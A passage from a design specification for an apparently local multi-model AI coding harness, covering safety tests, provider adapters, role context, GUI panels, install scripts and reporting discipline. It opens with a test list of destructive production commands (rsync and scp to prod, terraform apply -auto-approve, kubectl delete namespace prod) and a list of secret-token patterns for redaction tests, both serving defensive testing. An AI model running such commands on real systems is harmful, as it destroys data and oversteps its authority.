rsync -av ./ prod:/var/www
scp file prod:/var/www
terraform apply -auto-approve
kubectl delete namespace prod
```

Do not execute dangerous payloads in tests. Test parser/classifier decisions and structured block results.

## 88. Secret Attacks

Secret redaction tests should include realistic patterns:

```text
sk-...
ghp_...
github_pat_...
AKIA...
-----BEGIN OPENSSH PRIVATE KEY-----
Bearer eyJ...
xoxb-...
npm_...
pypi-...
GOOGLE_APPLICATION_CREDENTIALS JSON
.env lines
cookie headers
Authorization headers
URL query tokens
```

The redactor must handle secrets in stdout, stderr, JSON, headers, URLs, tool output, provider messages, GUI events, screenshots metadata, and cache records. Redaction should preserve useful debugging context without exposing values.

---

# Part XXVI. Detailed Provider Adapter Design

## 89. Provider Adapter Contract

Every provider adapter should implement a common contract:

```text
provider_id
provider_type
supports_streaming
supports_tool_calls
supports_json_schema
supports_prefix_cache
supports_reasoning_tokens
health_check()
prepare_request()
send_request()
parse_response()
parse_usage()
normalize_error()
redact_request_for_logs()
redact_response_for_logs()
```

The council layer should never need to know provider-specific response shapes. It should receive normalized output:

```json
{
  "provider_id": "deepseek",
  "model_id": "deepseek:reasoner",
  "role": "reviewer",
  "status": "success",
  "content": "...",
  "structured": {},
  "usage": {
    "input_tokens": 1234,
    "output_tokens": 456,
    "cache_hit_tokens": 1000,
    "cache_miss_tokens": 234
  },
  "latency_ms": 5310,
  "finish_reason": "stop",
  "redaction_status": "safe"
}
```

## 90. Provider Health

Provider health should be separate from provider availability. A provider may be configured but unavailable because a key is missing. It may be available but unhealthy because endpoint returns 500. It may be healthy but not eligible for a role because the model lacks context window or required capabilities.

Provider states:

```text
configured
disabled
missing_secret
available
unhealthy
rate_limited
degraded
blocked_by_policy
unknown
```

The GUI should show these states clearly.

## 91. Fallback Chains

Fallback chains should be config-driven. A reviewer role may prefer a reasoning model, then a cheaper reviewer, then a local verifier if available. Fallbacks should be bounded. Never retry indefinitely. Every fallback should record why it happened.

Fallback event fields:

```text
provider_id
model_id
role
failure_type
retry_count
fallback_to
policy_reason
duration_ms
```

---

# Part XXVII. Detailed Prompt Assembly and Role Context

## 92. Role-Specific Context Packs

Galaxy Merge should assemble context packs by role.

### Planner Context

```text
goal
project brief
WorkRoot and TaskScope
pinned project notes
relevant memory
file tree summary
recent failures
known commands
risk hints
```

Planner should not receive giant file dumps.

### Scout Context

```text
goal
search queries
file tree
candidate files
symbol/import hints
relevant notes
project conventions
```

Scout should inspect and return evidence, not invent architecture.

### Implementer Context

```text
specific files/excerpts
failing evidence
minimal plan
constraints
safety boundaries
expected patch style
```

Implementer should receive enough code to patch correctly, not the entire repo.

### Reviewer Context

```text
goal criteria
git diff
changed file excerpts
test/build output
browser evidence
safety decisions
risk notes
```

Reviewer should be adversarial but concrete.

### Skeptic Context

```text
goal criteria
final diff
verification outputs
remaining warnings
degraded provider state
browser/test evidence
blocked actions
known risks
```

Skeptic exists to prevent fake completion.

### Synthesizer Context

```text
structured role outputs
evidence references
contradictions
scores
selected plan
verification status
```

Synthesizer should not receive every raw transcript unless required.

## 93. Output Schemas

Role outputs should be structured. Example reviewer output:

```json
{
  "role": "reviewer",
  "status": "accepted|rejected|degraded",
  "findings": [
    {
      "severity": "blocker|major|minor|note",
      "claim": "The route fix does not update tests.",
      "evidence": {
        "type": "git_diff",
        "path": "src/router.py",
        "lines": [42, 51]
      },
      "recommended_action": "Add or update redirect test."
    }
  ],
  "completion_ready": false,
  "uncertainties": []
}
```

Unstructured prose can be tolerated for some models, but the harness should attempt schema repair or mark the output degraded.

---

# Part XXVIII. Detailed GUI Interaction Model

## 94. Goal Input

The goal input should support clear submission and should show the current goal. Once submitted, the backend creates a goal record. The GUI should show the parsed goal and completion criteria when available. Editing a goal mid-run should either create a new goal, revise goal with audit trail, or stop current goal and start a new one. It should not silently mutate mission state.

## 95. File Tree

The file tree must handle large repos. It should respect ignored folders, allow lazy loading, show changed files, show relevant files selected by the harness, and not freeze the browser. It should not render `node_modules` or giant generated folders by default.

## 96. Diff View

Diff view should show only changed files and allow inspection. It should connect to git diff if available and patchsets if no git exists. It should clearly mark unverified changes, verified changes, conflict changes, and blocked changes.

## 97. Council Panel

Council panel should show roles, provider/model, status, duration, output availability, degraded state, fallback path, and evidence contribution. It should distinguish "role not needed", "role pending", "role running", "role failed", "fallback used", "degraded but accepted", and "blocking failure".

## 98. Safety Panel

Safety panel should show blocked actions, allowed-with-audit actions, policy reason, target class, path/command, and session/goal. It should be searchable because safety logs can grow.

## 99. Browser/Web Panel

Browser/Web panel should show browser session, URL, screenshot, console errors, network errors, page errors, web sources, fetched pages, and whether browser evidence is clean. It should not bury fatal console errors behind a collapsed panel.

---

# Part XXIX. Install, Doctor, and Developer Workflow

## 100. Install Script

`scripts/install_local.sh` should be readable, reviewable, and safe. It should not be compressed into one unreadable line. It should not overwrite credentials. It should set up a virtual environment or user-local install, place `gm` on PATH safely, and explain what it changed. It should support idempotent re-run.

Install script checks:

```text
Python version
virtualenv availability
dependency install
launcher path
existing gm conflict
config example copy
no credential overwrite
no .env creation with real values
post-install doctor suggestion
```

## 101. Doctor Script

A `doctor.sh` or `gm doctor` command should check:

```text
Python version
package import
launcher resolution
PATH
config files
provider config presence
missing keys as warnings
browser automation availability
Node availability for GUI JS syntax check if needed
secret scan availability
Git availability
WorkRoot detection in sample project
```

Doctor should not require real provider keys. Missing provider keys are warnings, not fatal, unless the user is trying to use that provider.

## 102. Development Workflow

Recommended local workflow:

```bash
git status
python -m pytest -q --durations=30
python scripts/secret_scan.py
./scripts/run_dev.sh
gm   # from a generated sample project, not necessarily inside Galaxy Merge source
```

When maintaining Galaxy Merge itself, normal `gm` autonomous mode should enter read-only diagnostic mode. Explicit maintenance is performed by engineers/agents operating outside normal self-modding flow.

---

# Part XXX. Documentation Requirements

## 103. README

README should explain:

```text
what Galaxy Merge is
what it is not
install
run with gm
local config
environment variables
provider examples
browser GUI
.gm project state
safety model
testing
troubleshooting
public no-secrets policy
current implementation status
known limitations
```

It should not claim implemented features that are only planned. If a feature is partially implemented, say so. Docs lying is worse than docs being incomplete.

## 104. CONTRIBUTING

CONTRIBUTING should explain:

```text
no secrets
test commands
code quality expectations
module boundaries
line-count guidelines
public repo gate
how to add provider adapters
how to add tools
how to add GUI panels
how to write tests without real providers
how to run secret scan
```

## 105. Architecture Docs

Architecture docs should match code. If code changes provider config schema, docs must update. If routes change, docs must update. If `.gm` schema changes, migration docs should update. Every major subsystem should have a short design note.

---

# Part XXXI. Implementation Status Discipline

## 106. Evidence Over Claims

The harness project should not be judged by README claims, file names, or comments. It is judged by runtime behavior and tests. A file named `safety.py` does not prove safety. A function named `run_council` does not prove council fusion. A GUI panel named "Providers" does not prove provider routing. A cache folder does not prove compaction. A test named `test_browser.py` does not prove browser automation.

Every acceptance claim must have evidence:

```text
code path
test
runtime log
GUI state
generated .gm artifact
event JSONL
browser evidence
git diff
secret scan result
```

## 107. Partial Implementation Labels

If a subsystem is partial, say partial. Example:

```text
Browser automation: partial. Console log capture implemented using fake browser manager. Real Playwright integration skipped when driver missing.
```

This is acceptable. Fake completeness is not.

## 108. Regression Culture

Every fixed bug gets a regression test. If GUI JS broke due syntax, add JS syntax check in CI. If provider timeout hung, add fake timeout test. If `.gm` corrupted under concurrency, add lock/atomic write test. If secret leaked into logs, add redaction test. If self-codebase mode failed, add self-codebase detection test.

---

# Part XXXII. Final Maintenance Report Template

Use this structure after serious maintenance passes:

```text
# Galaxy Merge Harness Maintenance Report

## Overall Result
PASS / FAIL / PARTIAL

## Scope
What was inspected and what was intentionally out of scope.

## Local and Repo State
- local path:
- git remote:
- branch:
- HEAD:
- local-vs-GitHub differences:

## Runtime Evidence
- gm launch:
- backend URL:
- session ID:
- GUI connection:
- WebSocket:
- .gm state:
- terminal logs:

## Files Changed
- path:
  reason:

## Tests Run
- command:
  result:
  duration:
  evidence:

## Secret Safety
- scanner:
- tracked files:
- staged changes:
- history:
- result:

## Safety Evidence
- blocked actions:
- self-codebase test:
- location classification:
- redaction:

## Provider/Council Evidence
- configs validated:
- providers available:
- failures simulated:
- roles observed:
- fusion behavior:

## Browser/Web/GitHub Evidence
- browser logs:
- network logs:
- screenshots:
- web search:
- GitHub scan:

## Cache/Compaction Evidence
- cache hits:
- compaction trigger:
- mission state preserved:
- token telemetry:

## GUI Evidence
- panels verified:
- edge cases:
- screenshots/logs:

## Remaining Risks
- risk:
  severity:
  next action:

## Commit/Push
- commit hash:
- push status:

## Next Patch List
1.
2.
3.
```

---

# Part XXXIII. The Hard Line

Galaxy Merge should be allowed to be ambitious, but not vague. It is not enough for it to "use AI". It must make multiple models useful by constraining them inside an engineering system. It must let them reason but not let them mutate directly. It must let them disagree but force fusion through evidence. It must keep state but not hoard noise. It must be autonomous but not reckless. It must be local-first but not an OS parasite. It must be public-source-safe without leaking the user's machine. It must run from `gm` and show truth in the GUI. It must stop only when evidence supports completion.

That is the harness.

